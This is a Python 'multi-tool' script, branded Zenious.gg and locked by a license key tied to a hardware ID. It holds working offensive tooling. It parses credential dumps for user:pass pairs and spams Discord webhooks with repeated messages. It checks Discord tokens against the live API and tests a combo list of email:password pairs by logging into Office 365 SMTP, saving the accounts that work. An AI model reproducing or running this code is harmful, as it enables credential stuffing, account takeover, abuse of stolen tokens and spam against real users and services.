import os
import re
import shutil
import time
import itertools
import threading
import requests
import uuid
import platform
import hashlib
import smtplib

# Flag to control the animation loop
animation_running = True

def set_window_title(title):
    # Set the terminal window title
    if os.name == 'nt':  # For Windows
        os.system(f'title {title}')
    else:  # For Unix-based systems (Linux, macOS)
        print(f'\33]0;{title}\a', end='', flush=True)

def print_colored_logo_with_wave_effect():
    global animation_running
    logo = [
        " ________                     __                               ",
        "|        \\                   |  \\                              ",
        " \\$$$$$$$$ ______   _______   \\$$  ______   __    __   _______ ",
        "    /  $$ /      \\ |       \\ |  \\ /      \\ |  \\  |  \\ /       \\",
        "   /  $$  |  $$$$$$\\| $$$$$$$\\| $$| $$$$$$$\\| $$  | $$|  $$$$$$$",
        "  /  $$___| $$    $$| $$  | $$| $$| $$  | $$| $$  | $$ \\$$    \\ ",
        " /  $$    \\\\$$$$$$$\\| $$  | $$| $$| $$__/ $$| $$__/ $$ _\\$$$$$$\\",
        "|  $$     _\\$$     \\| $$  | $$| $$ \\$$    $$ \\$$    $$|       $$",
        " \\$$$$$$$$ \\$$$$$$$ \\$$   \\$$ \\$$  \\$$$$$$   \\$$$$$$  \\$$$$$$$ ",
        "                                                                ",
        "                                                                ",
        "                                                                ",
        "   __                          __                               ",
        "  |  \\                        |  \\                              ",
        " _| $$_     ______    ______  | $$  _______                     ",
        "|   $$ \\   /      \\  /      \\ | $$ /       \\                    ",
        " \\$$$$$$  |  $$$$$$\\|  $$$$$$\\| $$|  $$$$$$$                    ",
        "  | $$ __ | $$  | $$| $$  | $$| $$ \\$$    \\                     ",
        "  | $$|  \\| $$__/ $$| $$__/ $$| $$ _\\$$$$$$\\                    ",
        "   \\$$  $$ \\$$    $$ \\$$    $$| $$|       $$                    ",
        "    \\$$$$   \\$$$$$$   \\$$$$$$  \\$$ \\$$$$$$$                    "
    ]

    # ANSI escape codes for colors
    colors = ['\033[94m', '\033[95m']  # Blue and Purple
    RESET = '\033[0m'

    # Get the terminal size
    terminal_width = shutil.get_terminal_size().columns

    def print_logo_with_colors(colors):
        os.system('cls' if os.name == 'nt' else 'clear')
        for i, line in enumerate(logo):
            color = colors[i % len(colors)]
            print(color + line.center(terminal_width) + RESET)

    # Create a cycle of color combinations
    color_cycle = itertools.cycle(colors)

    try:
        while animation_running:
            # Shift the colors for a smoother wave effect
            current_colors = [next(color_cycle) for _ in range(len(logo))]
            print_logo_with_colors(current_colors)
            time.sleep(0.05)  # Adjust the speed of the wave effect for smoothness
    except KeyboardInterrupt:
        pass

def get_hwid():
    system_info = platform.system() + platform.machine() + platform.node() + platform.processor()
    mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    unique_info = system_info + mac_address
    return hashlib.sha256(unique_info.encode()).hexdigest()

def fetch_keys_from_github(url):
    response = requests.get(url)
    if response.status_code == 200:
        return response.text.splitlines()
    else:
        print("Failed to fetch keys from GitHub.")
        return []

def validate_key(url, user_key):
    hwid = get_hwid()
    key_hwid_pairs = fetch_keys_from_github(url)

    for pair in key_hwid_pairs:
        if ':' not in pair:
            continue  # Skip malformed lines
        key, stored_hwid = pair.split(':', 1)  # Ensure only one split
        if key == user_key and stored_hwid == hwid:
            return True
    return False

def process_file(input_file_path, output_folder, search_term):
    # Ensure the output folder exists
    os.makedirs(output_folder, exist_ok=True)

    # Define the output file path
    output_file_path = os.path.join(output_folder, "extracted_accounts.txt")

    # Read the input file with utf-8 encoding
    with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as file:
        lines = file.readlines()

    # Set to track unique user:pass combinations
    unique_accounts = set()

    # Filter and process lines
    with open(output_file_path, 'w', encoding='utf-8') as output_file:
        for line in lines:
            if search_term in line:
                # Use regex to extract user:pass
                match = re.search(r'://(?:[^:]+:)([^:]+):([^\s]+)', line)
                if match:
                    user, password = match.groups()
                    account_info = f"{user}:{password}"
                    if account_info not in unique_accounts:
                        output_file.write(account_info + "\n")
                        unique_accounts.add(account_info)

    print(f"Processed lines saved to {output_file_path}")
    time.sleep(0.5)
    os.system("cls")

def spam_webhook(webhook_url, message, count):
    for i in range(count):
        response = requests.post(webhook_url, json={'content': message})
        if response.status_code == 204:
            print(f"Message sent {i+1}/{count}")
        else:
            print(f"Failed to send message {i+1}/{count}")
        time.sleep(0.2)  # Adjust the delay between messages

def check_hotmail_outlook_accounts(input_file_path):
    # Define the output file path
    output_file_path = "active_hotmails.txt"

    # Read the input file with utf-8 encoding
    with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as file:
        lines = file.readlines()

    # Set to track valid accounts
    valid_accounts = []

    # Check each email:password pair
    for line in lines:
        line = line.strip()
        if ':' not in line:
            print(f"Skipping invalid line: {line}")
            continue  # Skip malformed lines

        email, password = line.split(':', 1)  # Ensure only one split
        try:
            # Connect to the Hotmail/Outlook SMTP server
            smtp_server = smtplib.SMTP('smtp.office365.com', 587)
            smtp_server.starttls()  # Upgrade the connection to a secure encrypted SSL/TLS connection
            smtp_server.login(email, password)
            smtp_server.quit()
            valid_accounts.append(f"{email}:{password}")
            print(f"Valid: {email}")
        except Exception as e:
            print(f"Invalid: {email}")

    # Save valid accounts to the output file
    with open(output_file_path, 'w', encoding='utf-8') as output_file:
        for account in valid_accounts:
            output_file.write(account + "\n")

    print(f"Valid accounts saved to {output_file_path}")
    time.sleep(0.5)
    os.system("cls")

def main():
    global animation_running

    # Set the window title
    set_window_title("Zenious.gg")

    # Start the logo animation in a separate thread
    logo_thread = threading.Thread(target=print_colored_logo_with_wave_effect)
    logo_thread.daemon = True
    logo_thread.start()

    # Wait for a short period to display the animation
    time.sleep(2)

    # Stop the animation
    animation_running = False
    logo_thread.join()

    # Clear the screen and display the menu
    os.system('cls' if os.name == 'nt' else 'clear')

    # ANSI escape codes for menu colors
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'

    while True:
        print(f"{BLUE}Multi-Tool Menu:{RESET}")
        print(f"{PURPLE}1. Process File{RESET}")
        print(f"{BLUE}2. Spam Webhook{RESET}")
        print(f"{PURPLE}3. Validate Discord Token{RESET}")
        print(f"{BLUE}4. Check Hotmail/Outlook Accounts{RESET}")
        print(f"{PURPLE}5. Exit{RESET}")

        choice = input(f"{PURPLE}Please choose an option (1, 2, 3, 4, or 5): {RESET}")

        if choice == '1':
            # Predefined input file path and output folder
            input_file_path = 'in.txt'
            output_folder = 'output'

            # Ask for the search term
            search_term = input("Enter the search term: ")

            # Run the file processing function
            process_file(input_file_path, output_folder, search_term)
        elif choice == '2':
            webhook_url = input("Enter the webhook URL: ")
            message = input("Enter the message to spam: ")
            count = int(input("Enter the number of messages to send: "))

            # Run the webhook spammer function
            spam_webhook(webhook_url, message, count)

            # Clear the screen after spamming
            time.sleep(0.5)
            os.system("cls")
        elif choice == '3':
            token = input("Enter the Discord token to check: ")
            is_valid, username = check_discord_token(token)
            if is_valid:
                print(f"Token is valid. Username: {username}")
            else:
                print("Token is invalid.")
            time.sleep(2)
            os.system("cls")
        elif choice == '4':
            input_file_path = input("Enter the path to the combo file: ")
            check_hotmail_outlook_accounts(input_file_path)
        elif choice == '5':
            print("Exiting the program.")
            break
        else:
            print("Invalid option. Please try again.")
            time.sleep(0.5)
            os.system("cls")

def check_key_and_run():
    github_url = "https://raw.githubusercontent.com/hxizx/boring/refs/heads/main/keys.txt"  # Replace with your GitHub raw URL
    user_key = input("Enter your key to access the program: ")

    if validate_key(github_url, user_key):
        print("Key validated. Access granted.")
        time.sleep(1)
        main()
    else:
        print("Invalid key or HWID mismatch. Access denied.")

def check_discord_token(token):
    headers = {
        'Authorization': token
    }
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if response.status_code == 200:
        user_data = response.json()
        return True, user_data['username']
    else:
        return False, None

if __name__ == "__main__":
    check_key_and_run()
